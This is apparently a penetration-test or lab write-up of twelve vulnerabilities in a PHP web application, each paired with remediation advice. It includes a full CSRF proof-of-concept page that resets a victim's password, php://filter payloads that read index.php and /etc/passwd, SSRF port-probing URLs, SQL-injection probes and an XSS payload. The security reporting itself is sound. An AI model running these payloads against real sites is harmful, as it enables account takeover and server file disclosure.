## 1 - User Enumeration
Enumeration of users through the login page and also on the registration page.

 - On the home page the message "Unknow User" is displayed
 - On the registration page, the message "This email address has already been taken." is displayed.

**Remediation**: *It is necessary to display generic messages such as "Bad login/password".*

## 2 - Brute force
It is possible to brute-force the different pages, so via user-enumeration it is possible to sharpen your attack to just brute-force the password.

It is also possible to brute-force the password reset page to spam a user's mailbox.

**Remediation** : *It is necessary to set up a rate-limit system and/or a captcha system.*

## 3 - Pre-Account Takeover
In this case, it is possible to register an account using another user's email as there is no validation during registration. In addition to impersonating a user, since the *secret* present on the account is static, even if the legitimate user performs a password reset to access his account. The attacker will always possess the secret.

**Remediation**: *Ask for the validation of the account by email*

## 4 - Improper Access Control on profil page
When you log in, you will see the *secret* page containing a user-specific *secret*. We also observe an ID in the URL, by changing this ID, we access the secret of another user.

**Remediation**: *When making a request, it is necessary to make sure that the user is authorized to access the requested resource/page*.

## 5 - Arbitrary file upload
On the account modification page, there are two upload forms, one via a file on disk, the other via a file per URL.

When using the upload functionality, we can see that there is no filtering on the extension. After some tests we realized that even if we upload a `.php` file it is not interpreted but it is still possible to upload a `.html` or `.svg` file to have an XSS-Stored.

In other cases, it is also possible to upload malicious files such as ransomware in order to distribute it via users through a legitimate domain.

**Remediation**: *Apply a white list of allowed extensions, also check the file's standard content and verify the content of the file.*

## 6 - Multiples CSRF

The application does not have any protection against FSNA, it is possible to, for example, takeover another user's account by changing his password or modify his information.

If you host the following page on your server, if a user *victim* the visit, his password will be changed.

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/domain.tld\/account\/change", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------341465401731709876833207203266");
        xhr.withCredentials = true;
        var body = "-----------------------------341465401731709876833207203266\r\n" + 
          "Content-Disposition: form-data; name=\"avatarupload\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------341465401731709876833207203266\r\n" + 
          "Content-Disposition: form-data; name=\"avatarlink\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------341465401731709876833207203266\r\n" + 
          "Content-Disposition: form-data; name=\"proveupload\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------341465401731709876833207203266\r\n" + 
          "Content-Disposition: form-data; name=\"provelink\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------341465401731709876833207203266\r\n" + 
          "Content-Disposition: form-data; name=\"password\"\r\n" + 
          "\r\n" + 
          "hacked\r\n" + 
          "-----------------------------341465401731709876833207203266\r\n" + 
          "Content-Disposition: form-data; name=\"cpassword\"\r\n" + 
          "\r\n" + 
          "hacked\r\n" + 
          "-----------------------------341465401731709876833207203266\r\n" + 
          "Content-Disposition: form-data; name=\"description\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------341465401731709876833207203266--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```

**Remediation**: *Requesting the user's password for sensitive actions such as changing the password, using an anti-CSRF token, checking the origin of the request via the header origin / referer and finally applying the "SameSite" flag on the cookies.*

## 7 - SSRF via document upload

The upload of document / image via profile modification suffers from a SSRF which allows several things:

 - Scanning the internal network using 
	 - The `http://localhost:3306` payload will not return an error, while the `http://localhost:22` payload will indicate *connection refused* which indicates that port 3306 which corresponds to MySQL is open.
 - Arbitrary file upload via the *file://* wrapper

A scan of the internal network, e.g. using the URL `http://127.0.0.1:22` will show `Connection refused` while the URL 

**Remediation** : *Filter user entries, check that only the HTTP wrapper can be used, make sure that the URL does not point to the server and that it points to a document (by filtering the extension)*

## 8 - LFI via PHP:// wrapper
It is possible to use the PHP:// wrapper to load a file from the server.

For example, the following payload allows to load the index.php file, this one will then be encoded in base64 by accessing your *profile image* or *identity document*.
```php
php://filter/convert.base64-encode/resource=index.php
```

**Remediation** *Filter user entries, check that only the HTTP wrapper can be used, make sure that the URL does not point to the server and that it points to a document (by filtering the extension)*

## 9 - Weak credentials on Admin page
By using content-discovery software such as *DirSearch* or *Ffuf*, it is possible to observe that an *admin* page is accessible with an authentication page.

By bruteforcing a set of login/password pairs, it is possible to log in with the user *Administrator* and the password *password123*.

**Remediation**:*Administration interfaces should at best be protected by IP restriction, privileged accounts must ensure that they use strong and unique passwords. It is also advisable to use a dual authentication solution.

## 10 - Stored XSS
It is possible to have at least two XSS stored.
One in XSS stored in the description via the payload `<script>alert(1)</script>` for example but also in the contact form, the payload will then be reflected on the administration page.

This XSS can therefore allow to steal the administrator's cookie and access his account since there is no *HttpOnly* flag on the cookie.

**Remediation** : *The first step to mitigate the XSS is to apply the "HttpOnly" flag on the cookies and use the "X-XSS-protection" header and also apply CSP. Filter user entries with a list of allowed characters and not a black list. Use the filter mechanisms of your framework making sure it has no known vulnerabilities and/or use filtering libraries such as [DOMPurify](https://github.com/cure53/DOMPurify). Also use a WAF to mitigate base XSS.*

## 11 - Information exposure over error message
There are several ways to make the application crash and display an error message. For example by using the following payload on the page to upload an image from a URL :
```php
php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd
```

Instead of returning the contents of the `/etc/passwd` file, the application will display an error message. This not only confirms that the application is in PHP, but also allows us to get the full path to the application, which is useful to better exploit the BIA and also to get information about the logic of the application. This single message allows us to see that the application seems to use a VCM architecture.

```php
**Warning**: file_get_contents(): open_basedir restriction in effect. File(../../../../../../../../../etc/passwd) is not within the allowed path(s): (/var/www//:/usr/lib/php/:/tmp/) in **/var/www/domain.tld/controllers/controllerDashboard.php** on line **70**
```

## 12 - SQL Injection
The application has several SQL injections, some injection points just return a 500 error which doesn't make them very easy to exploit.

Still on the image upload, using the payload `file://x'` for example, the application crashes and returns a nice SQL error:

```
**Warning**: file_get_contents(): remote host file access not supported, file://x' in **/var/www/domain.tld/controllers/controllerDashboard.php** on line **70**  
  
**Warning**: file_get_contents(file://x'): failed to open stream: no suitable wrapper could be found in **/var/www/domain.tld/controllers/controllerDashboard.php** on line **70**  
  
**Fatal error**: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'cobocop532@aenmail.net'' at line 1 in /var/www/domain.tld/models/Model.php:116 Stack trace: #0 /var/www/domain.tld/models/Model.php(116): PDO->prepare('UPDATE `users` ...') #1 /var/www/domain.tld/models/UsersManager.php(75): Models\Model->update('users', Array, Array) #2 /var/www/domain.tld/controllers/controllerDashboard.php(71): Models\UsersManager->updateAvatar('img/x'', 'cobocop532@aenm...') #3 /var/www/domain.tld/controllers/controllerDashboard.php(22): controllers\controllerDashboard->accountChange('Change Account', 'dashboard/viewA...', 'dashboard') #4 /var/www/domain.tld/app/includes/Routing.php(80): controllers\controllerDashboard->__construct('accountChange', 'Change Account', 'dashboard/viewA...', 'dashb in **/var/www/domain.tld/models/Model.php** on line **116**
```